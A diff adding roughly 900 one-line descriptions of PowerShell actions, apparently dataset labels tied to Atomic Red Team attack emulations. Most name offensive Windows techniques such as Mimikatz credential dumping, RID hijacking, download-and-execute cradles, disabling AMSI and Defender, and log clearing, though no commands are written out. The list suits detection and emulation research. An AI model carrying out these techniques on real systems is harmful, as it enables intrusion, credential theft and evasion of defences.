@@ -1,0 +1,901 @@
+Execute PowerShell code to open the Windows calculator using remote command execution.
+Attempt to perform RID hijacking on the user account "Peter" with RID 500.
+Execute a command on a remote host using PowerShell remoting.
+Connect to Azure AD, retrieve the user principal name, and remove the corresponding user.
+Create a minidump file for the process with ID 3742.
+Execute a PowerShell script with bypassing execution policy and hiding the window.
+Modify the Windows Registry to change the user's shell, possibly for persistence.
+Invoke Inveigh with HTTP protocol specified as "N."
+Enable PowerShell remoting on the local machine.
+Retrieve the version of the operating system.
+Execute a custom tool named "xordump_exe" with specific parameters.
+Compress files from the specified directory into an archive.
+Execute a hidden PowerShell script with bypassing execution policy.
+Remove a SMB share and a file share with specified names.
+Set a file path and execute the corresponding PowerShell script.
+Download and execute code from an untrusted URL on a remote computer.
+Perform DNS lookup for the specified IP address.
+Download and execute PowerShell code from a remote server.
+Search for indexed items with specific criteria.
+Execute obfuscated PowerShell script from a remote GitHub repository.
+Invoke a WMI command to create a process on a remote node.
+Download and execute PowerShell code from a potentially malicious website.
+Download and execute PowerShell code from a potentially malicious URL.
+Attempt to perform RID hijacking using the Guest account with RID 500.
+Download and execute PowerShell code from a potentially malicious GitHub repository on a remote system.
+Retrieve group memberships for a specified Active Directory user.
+Modify PowerShell profile to add content and start a process.
+Create a Unicode-encoded string in PowerShell.
+Execute a PowerShell script with specific execution settings and encoded command.
+Perform DNS resolutions in a loop with random subdomains.
+Attempt privilege escalation to achieve system-level access.
+List configuration information for application pools using appcmd.exe.
+Read content from a file and send it as a POST request to a specified IP address.
+Use NinjaCopy to copy the NTDS.dit file from a remote server to a local destination.
+Pause the execution for 60 seconds.
+Change directory to the temporary folder and execute Kerbrute for Kerberos bruteforcing.
+Use NinjaCopy to copy the NTDS.dit file from a local path to a remote destination on a server.
+Invoke Mimikatz to dump credentials on multiple computers.
+Execute PowerShell code stored in the variable "adrecon_path" using Invoke-Expression.
+Attempt to elevate privileges to achieve system-level access.
+Install a new web global module with specified name and DLL path.
+Execute malicious code on a remote system using PowerShell remoting.
+Download and execute PowerShell code from a potentially malicious server.
+Invoke an HTML Application (HTA) with specific parameters.
+Execute a PowerShell script with specific execution settings.
+Retrieve and group indexed items based on specific criteria.
+Inject DLL payload into a running process using mavinject and then stop the notepad process.
+Execute PsExec to add a user with specific credentials on a remote computer.
+Copy the Opera browser's login data to the temporary folder.
+Create a new registry item to disable Event Tracing for Windows (ETW).
+Download and execute a Metasploit payload from a specified URL.
+Execute a PowerShell script with bypassing execution policy.
+Attempt to perform RID hijacking on the user account "Alex" with RID 500.
+Encode and execute Mimikatz code using Win32 API.
+Execute custom PowerShell code on a remote host.
+Create a new registry item to disable privacy experience during Windows Out-Of-Box Experience (OOBE).
+Modify Windows Defender settings to disable anti-spyware features.
+Create a minidump file for the process with ID 2929.
+Start a process and then launch a new process under a specific parent with specified parameters.
+Execute a PowerShell script with bypassing execution policy.
+Exploit a backdoor in a LNK file for malicious activities.
+Download and execute a file from a potentially malicious server using Invoke-Expression.
+Download and execute PowerShell code from a potentially malicious server with specific encoding.
+Copy an Excel VBA add-in to the Excel startup folder and start Excel.
+Retrieve a PowerShell script for post-hashdump actions and execute it.
+Retrieve information about Active Directory replication accounts on a specific server.
+Retrieve information about domain accounts using the "net accounts" command.
+Attempt to perform RID hijacking on the user account "Robert" with RID 1002 and a specified password.
+Download and execute PowerShell code from a chain of commands using Invoke-Expression.
+Retrieve information about child items in the specified path.
+Map a new PowerShell drive to a specified network share.
+Download and execute PowerShell code from a potentially malicious URL with bypassing execution policy.
+Execute the Windows calculator using Invoke-Expression.
+Execute Mimikatz using Invoke-Expression.
+Retrieve the path of the current process, construct an injection command, and execute reflective PE injection.
+Retrieve information about the default web browser.
+Perform DNS MX record lookup for a specified domain and filter the output for mail-related information.
+Inject shellcode into a process with ID 7880.
+Download and execute PowerShell code from a specified URL with bypassing execution policy.
+Execute a hidden PowerShell command
+Attempt to load Mimikatz into the PowerShell profile for future execution.
+Send a malicious email with an attachment for test purposes.
+Download and execute a malicious payload from a remote server.
+Execute a DLL through WMI on a remote node using rundll32.
+Execute PowerShell with a hidden window and bypass execution policy to run malicious code.
+Execute a Base64-encoded PowerShell script with hidden window and bypassing execution policy.
+Execute a malicious PowerShell script with execution policy bypass and a hidden window.
+Query PnP entities to find imaging devices on the system.
+Run Inveigh tool with specific spoofing configurations.
+Search for files with the name "Formula 1" on a remote server's 'users' share.
+Perform RID Hijacking on the host with RID 500 and specified password.
+Start recording the webcam for 15 seconds and save the output to 'C:\webcam.mkv'.
+Encrypt a file using GPG with specified GPG executable and file locations.
+Compress files in the specified input path and save the archive to the specified destination path.
+Invoke a command on a remote computer to download and execute a malicious script.
+Execute a PowerShell script named Kern64.ps1 with execution policy bypass.
+Perform credential injection targeting the domain 'demo' and the 'administrator' account with a new winlogon session.
+Import the PowerView module and retrieve information about domain computers.
+Copy Microsoft Edge user data to a temporary folder.
+Modify the creation time of files in the specified path to the target date and time.
+Manipulate tokens to create a new process (cmd.exe) with a specific thread ID.
+Retrieve information about Win32 processes using WMI.
+Perform RID Hijacking on the guest account with RID 500 and specified password.
+Retrieve information about SMB shares on the system.
+Run the Nightmare tool to create a new user 'Pedrol' with password 'password1' and specified driver name.
+Invoke a command on a remote server using PowerShell with specific options and an encoded command.
+Change the current location to the specified folder and run a PowerShell script with specific parameters.
+Invoke a PowerShell command on a remote system using the specified PowerShell code.
+Download and execute a script from a remote URL to dump Windows credentials.
+Retrieve Group Policy Preferences passwords.
+Download and execute a PowerShell script from a remote server.
+Manipulate tokens to create a new process (cmd.exe) with the username 'nt authority\system'.
+Execute a PowerShell script named maliciousscript.ps1 with execution policy bypass.
+Execute PowerShell code with hidden window, no profile, and loading code from the file WinPwn.ps1.
+Retrieve indexed items from the specified path, filter by camera maker, and group by focal length.
+Perform credential injection targeting the domain 'demo' and the 'administrator' account with an existing winlogon session using NetworkCleartext logon type.
+Change the current directory to the temporary folder, run the Kerbrute tool to brute force user accounts, and output results to a file.
+Stop and remove a specified service by name.
+Start a foreground BITS transfer from a remote source to a local destination.
+Download and execute a PowerShell script from a remote server with bypassed execution policy.
+Remove a specific AMSI provider registry key.
+Execute the Backstab64 tool with specific options and process name.
+Invoke a command on a remote server to start a process with the specified file path.
+Create or overwrite a text file named 'message.txt' with the specified content.
+Execute Mimikatz in memory to dump credentials with bypassed execution policy.
+Create a new registry item to run a specified command automatically.
+Invoke a command on a remote computer to download and execute a malicious PowerShell script.
+Analyze PowerShell command line parameters for potential attack vectors.
+Download and execute a PowerShell script from a specific GitHub repository with hidden window and no profile.
+Perform RID Hijacking on a specific user (Anna) with RID 1002, using a specified password and enabling the hijack.
+Run the Inveigh tool in inspection mode.
+Create a new Windows service with a specified name and binary path, then start the service.
+Display Resultant Set of Policy for the current user or system.
+Retrieve indexed items matching the filter 'stingray' from the My Pictures folder and its subfolders.
+Set Windows Defender exclusion path using the specified variable.
+Copy Sandcat executable to a remote system's 'Public' folder on the C drive.
+Invoke a malicious HTML Application (HTA) file with specific options and simulate lateral movement.
+Retrieve information about Chromium browsers using SharpChromium.
+Execute a PowerShell script named <rootFile.ps1> with bypassed execution policy.
+Invoke a command on a remote computer to download and execute a malicious PowerShell script from a specific URL.
+Download and execute a PowerShell script from a potentially malicious source.
+Retrieve Active Directory users with specific account control flags and format the output table.
+Start a process with the specified executable path (Ammyy Admin).
+Use nltest to retrieve information about the domain controller for the current user's domain.
+Download and execute a remote script, then use Mimikatz to dump credentials.
+Retrieve Internet Explorer bookmarks information for a specified user.
+Download and execute a PowerShell script from a potentially illegal website.
+Download and execute a PowerShell script from a specific GitHub repository with hidden window and no profile.
+Perform reflective PE injection using specified PE bytes and execution arguments.
+Execute a PowerShell script file with bypassing execution policy.
+Perform egress network checks to specified IP and port ranges with a delay and verbose output.
+Execute Mimikatz to dump credentials and save the results to a file.
+Download and execute a PowerShell script from a remote site (exampleExploit.com).
+Define a PowerShell script in a variable and convert it to Unicode-encoded bytes.
+Execute reflective PowerShell code encoded in SharpGen's format.
+Install a Security Support Provider (SSP) library from the specified path.
+Clear the command history in PowerShell.
+Execute PowerShell code from the specified input file.
+Access the current user's environment variables in PowerShell.
+Retrieve information about running processes in PowerShell.
+Collects information about processes, specifically targeting "lsass" process.
+Attempts to execute commands on a remote system using SMBExec with specified credentials.
+Imports a module and performs password spraying against Microsoft 365 accounts using MSOLSpray.
+Decodes and executes a Base64-encoded PowerShell command.
+Downloads and executes a PowerShell script from a specified URL.
+Copies a file with specific filtering conditions, likely part of a larger operation.
+Executes Mimikatz to obtain and debug privileges on a remote computer.
+Invokes a command to disable RemoteFX vGPU on a specified module and path.
+Starts a new process using the specified script path.
+Attempts to add a new user ('SMBExec') with the password 'Winter2017' on a remote system using SMBExec.
+Defines and invokes the Mimikatz command using Invoke-Expression.
+Downloads and executes a PowerShell script from a potentially untrusted source.
+Removes an item specified by the path after joining with the result of a command that retrieves the first item in the prefetch directory.
+Collects browser history information for the user 'Bob' across all browsers.
+Downloads and executes a PowerShell script from a specified URL.
+Invokes a command on a remote computer to download and execute a malicious PowerShell script.
+Executes the Windows rundll32.exe command to show the key manager (credential manager) dialog.
+Defines a Mimikatz command and executes it using encoded PowerShell.
+Executes a PowerShell script named 'msysWin.ps1' with specific execution policies.
+Invokes Inveigh with specified parameters, potentially for network discovery and interception.
+Removes the history file associated with the PSReadline module.
+Imports the 'powerview.ps1' module and retrieves information about users with admin count using PowerShell.
+Gets indexed items with specific values, filters, and paths, likely related to recorded TV.
+Imports the 'Invoke-DCOM.ps1' module.
+Adds a firewall rule to open a specified TCP port.
+Invokes DLL injection into a process with a specific ProcessID using a DLL named 'juve.dll'.
+Creates a new item at the specified path and removes an item, potentially related to TeamViewer log files.
+Collects bookmark information for the user 'user1' in Internet Explorer.
+Invokes a command on a remote computer to download and execute a malicious script from a specified URL.
+Retrieves information about Windows user accounts using WMI.
+Invokes shellcode with specific hexadecimal values.
+Attempts to perform RID Hijacking with specified user, RID, password, and enabling the attack.
+Downloads and executes a remote script, followed by invoking Mimikatz to dump credentials.
+Downloads and executes a PowerShell script from a specified URL with hidden window style.
+Defines a path to a Windows executable and executes it with a specified remote URL.
+Executes multiple commands using cmd.exe, appending results to a history log file.
+Executes a malicious PowerShell script located at "C:\MaliciousScript.ps1" with specific execution policies and settings.
+Downloads and executes a PowerShell script from a potentially malicious URL with specific settings.
+Invokes a command (payload) on a remote computer.
+Executes a PowerShell script located at "C:\evilFail.ps1" with specific execution policies.
+Retrieves information about the current user.
+Downloads a PowerShell script using cURL and executes it using Invoke-Expression.
+Modifies an AMSI-related field to disable AMSI in PowerShell.
+Downloads and executes a PowerShell script from a specified URL with specific settings.
+Defines excluded extensions and adds them to Windows Defender preferences.
+Retrieves information about Active Directory computers with no specific filter.
+Executes FoxDump to retrieve information about passwords and saves the output to a file.
+Purges Kerberos tickets and executes Kerberoasting with specified flags, outputting the result to a file.
+Creates a new local user named "Administrator" with no password.
+Appends information about processes to a log file.
+Invokes shellcode with specific hexadecimal values.
+Executes Mimikatz using PowerShell.
+Executes a PowerShell script named 'WinDanger.ps1' with specific execution policies.
+Invokes a CIM method on the Win32_Product class with specific arguments.
+Executes a PowerShell script named 'Invoke-MimiKatz.ps1'.
+Unblocks (removes the mark of the web) on a specified file path.
+Downloads and executes a PowerShell script from a specified URL.
+Uses ADSI to search for computer objects in Active Directory.
+Downloads and executes a PowerShell script from a specified URL using Invoke-Expression.
+Executes the "Nightmare" module to create a new user with a specified username, password, and driver name.
+Encodes a base64 string and assigns it to the variable '$b'.
+Downloads and executes a PowerShell script from a specified URL using Invoke-Expression.
+Defines and invokes the Mimikatz command using Invoke-Expression.
+Invokes a command on a remote system using PowerShell remoting.
+Executes Mimikatz to dump credentials with specific execution policies.
+Gets indexed items with specific filtering conditions and keywords.
+Uses ping to send data to a specified IP address using content from a file.
+Executes multiple commands to retrieve information about domain users and local group members.
+Invokes a command on a remote computer to download and execute a malicious script from a specified URL.
+Retrieves the current username from the environment variables.
+Retrieves information about directory service computers using WMI.
+Attempts to obtain system-level privileges using specific service and pipe names.
+Removes an item specified by the path and includes the '-Recurse' parameter to remove items in subdirectories.
+Create a new Hyper-V virtual machine named ${vm_name} with Generation 2, disable Secure Boot in its firmware settings, and start the virtual machine.
+Execute the Akagi64.exe tool with parameters '45' and 'C:\Windows\System32\cmd.exe'.
+Run malicious code that displays a Windows Forms message box with the message 'Malicious Code'.
+Run PowerShell with specific settings to execute a command stored in encoded form.
+Retrieve all Active Directory groups without applying any filter.
+Download and execute a PowerShell script named 'Win32.ps1' from 'http://server.com/' using Invoke-Expression.
+Perform DNS resolution by querying the specified volume of times (${query_volume}) for a randomly generated subdomain with the specified type (${query_type}) and domain (${domain}).
+Create a new local user account with the specified username and no password.
+Disable User Account Control (UAC) by setting the EnableLUA registry key to 0.
+Remove the specified file from the system.
+Retrieve network configuration information for the system.
+Remove the specified file from the system.
+Enumerate and display information about tokens on the system.
+Inject and execute shellcode into the process with the specified ProcessId (1245).
+Display information about user accounts and policies on the network.
+Set the execution policy for PowerShell scripts to Bypass at the local machine scope.
+Execute a PowerShell script named 'evil_script.ps1' with specific execution settings.
+Enable various Windows Defender preferences, including runtime scanning and automatic sample submission.
+Retrieve indexed items matching specified criteria within the specified path.
+Change directory to the temp folder and execute Kerbrute to perform user enumeration on the specified domain controller.
+Retrieve the password for the site list.
+Execute PowerShell with specific settings to download and execute a script from a specified URL.
+Retrieve indexed items matching specific criteria, including filtering by content and keywords.
+Import the Powerview module, retrieve NetUser information with SPN, and convert the output to JSON.
+Execute PowerShell with specific settings to download and execute a suspicious script from a specified URL.
+Download and execute a PowerShell script named 'exploit.ps1' from a specified URL.
+Invoke a command on a remote computer to download and execute a malicious script from a specified URL.
+Create a memory dump of the LSASS process using rundll32.exe and comsvcs.dll.
+Invoke a command to download and execute a malicious PowerShell script using curl.
+Perform RID Hijacking to impersonate the specified user (alice) with the specified RID, password, and enable the impersonation.
+Perform RID Hijacking to impersonate the specified user (Max) with the specified RID and password.
+Execute PowerShell with specific settings to download and execute a script from a specified URL with a hidden window.
+Invoke MS16-135 vulnerability to download and execute a payload from a specified URL.
+Execute PowerShell with specific settings to download and execute a heavy system script from a specified URL.
+Download and execute a malicious payload from a specified URL, then start a process with the payload.
+Set a registry property to execute a specified binary along with the Userinit process during system startup.
+Execute PowerShell with specific settings to invoke Mimikatz, a tool for extracting credentials from memory.
+Search for domain objects in the specified domain with a custom LDAP filter and retrieve specific properties.
+Retrieve Group Policy Objects (GPOs) from the domain and append the output to a specified file.
+Start a notepad process, pass it through, and use it to run the Mimikatz command.
+Invoke DCOM to execute the 'calc.exe' command on a remote computer using the MMC20.Application method.
+Execute a command using cmd.exe to perform asreproast with specific output file settings.
+Perform RID Hijacking to impersonate the specified user (Iris) with the specified RID and password.
+Create a new process for 'cmd.exe' using token manipulation with a specified thread ID (875).
+Display NetBIOS name cache information.
+Create a new TCP client connection to the specified IP address.
+Create a new process for 'cmd.exe' using token manipulation on the wininit process and wait for the process to exit.
+Retrieve the current active user name and append it to a text file.
+Retrieve indexed items matching specific criteria within the specified path, including filtering by kind and title.
+Invoke the PrintDemon vulnerability using the specified Base64-encoded payload.
+Create a new WebClient object and configure proxy settings using the system's web proxy.
+Execute PowerShell with specific settings to download and execute a script from a specified URL with hidden window style.
+Retrieve indexed items matching specific criteria within the specified path, including filtering by stingray.
+Execute a PowerShell script named 'badProject.ps1' with specific execution settings.
+Invoke Mimikatz to dump credentials on multiple specified computers.
+Retrieve the default domain password policy from Active Directory.
+Invoke PowerShell to download and execute a malicious script from a specified URL using Invoke-WebRequest and Invoke-Expression.
+Compress the specified input files into a new archive at the specified destination with forced compression.
+Execute PowerShell with specific settings to download and execute a malicious file from a specified URL with a hidden window.
+Execute a command using cmd.exe to perform asreproast with specific output file settings.
+Copy the specified input file to the specified output file, start a process with the output file, get the process ID, and stop the process.
+Set the location to the specified folder, then execute a PowerShell script related to T1071.004 with specific parameters.
+Retrieve information about the status of services on the system.
+Execute PowerShell with specific settings to download and execute a malicious script from a specified URL with hidden window style.
+Retrieve the contents of the clipboard in raw format.
+Execute PowerShell with specific settings to download and execute a script from a specified URL with bypassed execution policy.
+Perform RID Hijacking to impersonate the specified user (David) with the specified RID, password, and enable the impersonation.
+Invoke a command on a remote computer to download and execute a malicious script from a specified URL.
+Create a new registry property to disable the operational log for Windows Defender.
+Execute a VBScript using the cscript interpreter.
+Retrieve Active Directory users who do not require pre-authentication.
+Create a new WebClient object and download a file from a specified URL to a specified output location.
+Execute PetitPotam attack with specific parameters and print a message indicating the end of the attack.
+Create a minidump of the explorer process using Out-Minidump.
+Send a POST request to a specified IP address with the content of the specified input file.
+Execute a payload with a specific identifier and perform a scan.
+Execute PowerShell script using Invoke-CradleCrafter to download and execute 'calc.exe' payload from a specified listener.
+Execute a PowerShell command with parameters to bypass execution policies, hide the window, and execute encoded command.
+Execute a command using variables 'renamedBinary' and 'XmlPayload' with output redirected to 'output.txt'.
+Download and execute a PowerShell script from a specified URL using Invoke-Expression.
+Retrieve information about the PowerShell version by accessing the $PSVersionTable variable.
+Invoke the execution of a command using PowerShell's Invoke-Expression, running a potentially malicious file located at 'C:\Windows\temp\bad_file.exe'.
+Start a new process using the Start-Process cmdlet with the specified script path stored in the variable 'Scrip_Path'.
+Download and execute a PowerShell script from a specified URL using Invoke-Expression with bypassed execution policy.
+Download and execute a malicious payload using Invoke-Expression and initiate a new process with the payload using Start-Process.
+Set PowerShell ReadLine options to disable adding commands to the history.
+Execute a hidden PowerShell command with bypassed execution policy to download and execute a script from a specified malicious site.
+Copy Firefox profiles to a temporary location.
+Invoke NinjaCopy to remotely copy a file to another location.
+Invoke Expression to download and execute a script from a malicious website.
+Download and execute a PowerShell script from a malicious domain.
+Import PowerView module and invoke ShareFinder with specified parameters.
+Invoke ExecuteMSBuild on a remote computer to download and execute a payload.
+Invoke MS16-032 vulnerability exploitation.
+Run Nmap scan on a specified host.
+Invoke a command with a potentially malicious script block on a target machine.
+Invoke a command with a potentially malicious script block on a target machine.
+Create a new web global module with specified name and DLL path.
+Azure login and delete an AD user with specified user principal name.
+Invoke a potentially malicious script block on a target system.
+Invoke a potentially malicious script block on a specified target.
+Search for Active Directory groups using ADSI searcher.
+Start a process based on the results of a filtered and sorted indexed item search.
+Perform a domain password spray attack using the password "Winter2016".
+Download and execute a PowerShell script from a malicious website with hidden execution.
+Invoke Mimikatz to dump credentials using PowerShell.
+Modify registry to create a Run key with a specified value.
+Download and execute a malicious payload from a specified website.
+Invoke expression to execute code from a specified file.
+Invoke RID Hijacking with specified options.
+Map a network drive using specified credentials.
+Get indexed items with a specific value from a specified path and recurse.
+Invoke Mimikatz to dump credentials with specified PowerShell options.
+Invoke Mimikatz to dump credentials using PowerShell with specified options.
+Use WMIC to get process information and append it to a log file.
+Invoke REST method to retrieve metadata and convert it to JSON, then save it to an output file.
+Download and execute code from a specified website with hidden execution.
+Get information about TCP connections using PowerShell.
+Create a code snippet and invoke it as a script block.
+Download and execute a malicious script from a specified website with bypass execution policy.
+Download and execute a malicious script from a specified website with hidden window style.
+Run NBTSTAT to get NetBIOS information for a specified remote host IP.
+Copy Sandcat executable to a specified drive on a remote host.
+Invoke Expression to download and execute a script from a dangerous domain.
+Start PowerShell and run a script with specified arguments to emulate administrator tasks.
+Invoke PsExec to run a command on a remote computer with specified options.
+Download and execute a script from a malicious website with hidden execution.
+Run CMD to execute Netcat with specified options.
+Output ATHER command line parameters with specified options.
+Get credentials from Credential Manager and select the Target property.
+Run a PowerShell script with specified options.
+Create a new item property in the registry with specified options.
+Invoke a potentially malicious script block on a remote computer.
+Invoke SMBExec to run a command on a remote system with specified options.
+Download and execute malware from a specified website using PowerShell with hidden execution.
+Search for hidden directories with ".git" attribute in C:\Users and retrieve the parent directory's full path.
+Perform a domain password spray attack using usernames as passwords and save valid credentials to a file.
+Invoke ATHER with specified options for compiled help.
+Invoke Mimikatz to dump certificates.
+Resolve the path for createdump.exe and create a dump of lsass process with specified options.
+Run a PowerShell script with specified options and hide the window.
+Invoke a potentially malicious command on a target computer.
+Download and execute code from a malicious website with specified PowerShell options.
+Invoke a command on a target computer with a potentially malicious encoded command.
+Invoke Mimikatz to perform credential extraction with specified PowerShell options.
+Invoke ATHER with specified options to create an HTML Application (HTA).
+Run a command with specified parameters and output the result to a file.
+Invoke token manipulation on the wininit process to impersonate a user.
+Download and execute a script from a specified website with hidden execution using PowerShell.
+Invoke a web request to download a file from a specified URL and save it to a local file.
+Invoke a web request to a potentially malicious website with specified PowerShell options.
+Get Active Directory objects using a specified LDAP filter and server.
+Download and execute a script from a malicious URL using PowerShell.
+Invoke Inveigh with specified options to craft an HTTP response.
+Create a new item property in the Windows Registry with specified options.
+Map a network drive using specified domain credentials.
+Download and execute a PowerShell script from a remote server using Invoke-Command.
+Retrieve Group Policy Objects (GPOs) in the specified domain and append the results to a file.
+Execute a malicious PowerShell script located at C:\malicious_script.ps1 with bypassing execution policy and without loading user profiles.
+Run a batch file (Psiphon.bat) located at the specified path.
+Rename mission.go to mission.exe and then execute it with specific parameters.
+Start a new process on the remote machine specified by ${RemotePcPath}.
+Perform a domain search in the specified LDAP search base.
+Invoke ATHHTMLApplication with specified parameters.
+Invoke Boolang with the specified NapoliSource parameter.
+Download and execute a potentially malicious PowerShell script from a remote server using PowerShell.exe.
+Download content from the specified URL into ${Output_File} and open it using Invoke-Item.
+Download and execute a malicious PowerShell script from a remote server.
+Retrieve and format information about recorded TV items using PowerShell.
+Download and execute a script from a shortened URL using PowerShell.
+Download and execute a malicious script with Bypass execution policy in PowerShell.
+Map a network drive using specified credentials.
+Disable HTTP logging for a specified website in IIS using PowerShell.
+Configure and execute a command in the Atomic Red Team framework using PowerShell.
+Download and execute a malicious PowerShell script from a remote server.
+Ping a remote host using the Windows command prompt.
+Invoke a command on a remote computer to download and execute a malicious PowerShell script.
+Execute a PowerShell script to log keystrokes with specified parameters.
+Delete all Volume Shadow Copies using PowerShell.
+Set a registry value using PowerShell.
+Copy files with specified filtering criteria using PowerShell.
+Start a process with the specified path using PowerShell.
+Download and execute a malicious PowerShell script from a remote server.
+Start recording from the webcam using PowerShell.
+Download and execute a malicious PowerShell script with Bypass execution policy.
+Read content from a file and send it as a POST request to a specified IP address using PowerShell.
+Copy a file, start a process with it, retrieve the process ID, and stop the process using PowerShell.
+Create a new registry item to disable Command Prompt using PowerShell.
+Check for virtualization environment and print a message if detected using PowerShell.
+Execute a command with Tater to add a user and add it to the administrators group using PowerShell.
+Invoke shellcode in a specified process ID using PowerShell.
+Execute a Boolang script using PowerShell.
+Execute the Nightmare payload using PowerShell.
+Inject a DLL into a running process and make a web request using PowerShell.
+Invoke a command on a remote computer using PowerShell.
+Run PowerShell to execute the Calculator application with elevated privileges.
+Run PowerShell to execute Mimikatz and dump credentials.
+Update the LastWriteTime of files in a specified path using PowerShell.
+Execute PsExec on a remote computer with specific service parameters.
+Update the LastAccessTime of files in a specified path using PowerShell.
+Purge Kerberos tickets and run Kerberoasting using cmd.exe and PowerShell.
+Set PowerShell Readline options to save nothing in history.
+Run PowerShell to execute Mimikatz and dump credentials.
+Exploit Jenkins with a specified command and target using PowerShell.
+Reference a specific file path in the Atomic Red Team framework.
+Download and execute a malicious PowerShell script from a remote server.
+Change directory to the temp folder and run Kerbrute to perform a password spray attack using PowerShell.
+Invoke RID Hijacking with specific user, RID, password, and enable parameters using PowerShell.
+Invoke a command on a remote computer with a specified malicious command using PowerShell.
+Retrieve browser history information for a specified user and browser using PowerShell.
+Set environment variables and run PowerShell with a delay using the Start-Sleep cmdlet.
+Copy a file from a network share to a local destination using PowerShell.
+Invoke a script block that retrieves process information and writes it to a file using PowerShell.
+Invoke NetRipper with specific logging, process name, and verbose parameters using PowerShell.
+Define a syntax list, iterate through it, and execute SharpView with each syntax using PowerShell.
+Change location to a specified path and run accesschk.exe with specific parameters using PowerShell.
+Run a VBScript using the Windows Script Host and redirect output to a file using PowerShell.
+Invoke Token Manipulation to display all available tokens using PowerShell.
+Download and execute a malicious PowerShell script from a remote server.
+Run rundll32.exe with a specified input file and entry point using PowerShell.
+Run a PowerShell script with Bypass execution policy using PowerShell.
+Download a file from a remote server using PowerShell.
+Invoke a command to retrieve process information and save it to a file using PowerShell.
+Download and execute a malicious PowerShell script from a remote server with a hidden window.
+Run Nmap to perform network scanning on a specified host using PowerShell.
+Download and execute a malicious PowerShell script from a dangerous URL.
+Invoke a script block using PowerShell.
+Add a port proxy using netsh to forward traffic from one port to another using PowerShell.
+Invoke Shellcode with specified shellcode bytes using PowerShell.
+Define an excluded process and add it to Windows Defender preferences using PowerShell.
+Download and execute a malicious PowerShell script from a remote server with Bypass execution policy.
+Run a PowerShell script with Bypass execution policy from a local file.
+Enable PowerShell remoting and run a command on the local computer using PowerShell.
+Get the explorer process, retrieve its ID, and inject a DLL into it using PowerShell.
+Copy pictures related to 'Stingray' and 'portfolio' to a specified destination using PowerShell.
+Invoke Atomic Red Team's Compiled Help Module with specified HH and CHM file paths using PowerShell.
+List all items with the name "Bookmarks" in the "C:\Users\" directory and its subdirectories, ignoring errors and forcing the operation.
+Download a payload from a specified URL and execute it using PowerShell.
+Rename a binary file, execute it with an XML payload, and redirect the output to a text file.
+Rename a file and execute it with specific parameters using PowerShell.
+Invoke Inveigh Relay to perform user and group manipulation on a specified target.
+Invoke a command on a remote host to download and execute a script from a malicious site using PowerShell.
+Invoke shellcode using PowerShell.
+Invoke a command with heavy code on a specified remote target using PowerShell.
+Download and execute a malicious PowerShell script from a hidden window with Bypass execution policy.
+Download and execute a script from a GitHub repository using PowerShell.
+Add a registry entry to disable Hypervisor Enforced Code Integrity using the Windows Registry.
+Monitor clipboard activity with a collection limit of 120 entries.
+Download and execute a PowerShell script from a remote server.
+Start a hidden PowerShell process and load a specific assembly.
+Remove a folder and its contents.
+Inject and execute shellcode in a specified process with ID 4274.
+Inject a malicious DLL into a process with ID 1926.
+Download a file from a remote server using PowerShell.
+Download and execute a PowerShell script from a specified URL.
+Execute a VBScript using cscript.
+Download and execute a PowerShell script from a remote server using the -c flag.
+Clear the Security and System event logs.
+Create a notepad process, inject context, wait for 5 seconds, and then stop the notepad process.
+Compress the contents of a directory into an archive file.
+Start recording the webcam for 10 seconds and save the output to 'C:\webcam.avi'.
+Execute malicious code on a remote host using PowerShell.
+Perform RID Hijacking with specified RID, password, and using the host account.
+Execute Backstab64.exe with specific parameters.
+Manipulate tokens to create a new process (cmd.exe) with ProcessId 500.
+Invoke Mimikatz to dump credentials and then execute shellcode with a reverse TCP payload.
+Run malicious code on a specified remote target using PowerShell.
+Download and execute a PowerShell script on a remote host.
+Retrieve information about Internet Explorer bookmarks for user2.
+Execute arbitrary PowerShell commands on a remote computer.
+Download and execute a malicious PowerShell script from a specific domain.
+Create a minidump of the Chrome process.
+Invoke DCOM to execute Excel DDE (Dynamic Data Exchange) method with the command 'calc.exe'.
+Execute a malicious command on a remote system using PowerShell.
+Execute an encrypted PowerShell command with specific options.
+Add a certificate from a Personal Information Exchange (PFX) file to the certificate store.
+Query information about imaging devices using CIM.
+Change directory to temp and execute Kerbrute to perform a password spray attack against a domain controller.
+Download a file from a remote server using a .NET WebClient.
+Start a new PowerShell process with specific arguments, including an encoded command.
+Perform reflective DLL injection with specified PE bytes, executable arguments, and process ID.
+Send an email with specified parameters, including attachments.
+Import a PowerShell module and use DNS exfiltration with specified parameters.
+Invoke Mimikatz to dump credentials on multiple specified computers.
+Retrieve and display ACL information for registry services.
+Download and execute a PowerShell script from a remote server on a specified target.
+Download and execute a PowerShell script on a specified target host.
+Execute a PowerShell script from a specific file path.
+Copy a file from a remote location to the local temporary folder.
+Start a new process under a specific parent process with specified ParentId and TestGuid.
+Copy files from a specified path to a local destination using NinjaCopy.
+Invoke an Attack Tool Harness (ATH) compiled help simulation with a CHM file.
+Execute a hidden PowerShell command to invoke a web request to a threatening site.
+Invoke PowerShell Expression to download and execute a malicious script from a specific website.
+Create a new service with a specified name and binary path, then start the service.
+Start a process (Web browser passview) and stop it after 5 seconds.
+Execute a hidden PowerShell command to invoke Mimikatz and dump credentials.
+Create a minidump of a specified process with ID 5121.
+Download and execute a malicious PowerShell script from a remote server using the -c flag.
+Download and execute a PowerShell script from a remote server on a specified IP.
+Query the Windows registry for values containing 'password'.
+Retrieve information about the current Windows identity and save it to a file.
+Execute a specified payload with a specific data source.
+Enable RID Hijacking for a user named Jennifer with RID 1002 and password 'Passw'.
+Execute an encoded PowerShell command with specific options.
+Invoke MSBuild execution on a specified computer with specific credentials.
+Purge Kerberos tickets, execute a command using cmd.exe, and perform Kerberoasting with specific flags and output file.
+Execute a hidden PowerShell command to invoke a web request and download/execute a script from a specific site.
+Download and execute a BOF (Binary Offset Function) payload from a specific URI.
+Download an HTA file, save it to a temporary file, execute it using mshta, wait for 15 seconds, and then stop the Calculator process.
+Execute an illegal command on a remote host using PowerShell.
+Mount a disk image from a specified path.
+Execute a PowerShell script from a specific file path with Bypass execution policy.
+Start a process (WebBrowserPassView), sleep for 3 seconds, and then stop the process.
+Execute a PowerShell command with a base64-encoded command.
+Invoke DCOM to start a specified service on a remote computer.
+Download and execute Mimikatz to dump credentials using a hidden PowerShell process.
+Test the network connection to a specified domain and port.
+Send an email with a specific subject, sender, receiver, attachments, and SMTP server.
+Download and execute a PowerShell script from a GitHub repository to get system information.
+Download and execute a PowerShell script from a specified server, including a secondary malicious file.
+Echo the status of User Account Control (UAC).
+Query the Windows registry for values containing 'password' in the current user's hive.
+Retrieve information about installed antivirus products using Windows Management Instrumentation (WMI).
+Download and execute a PowerShell script from a remote server using a hidden process.
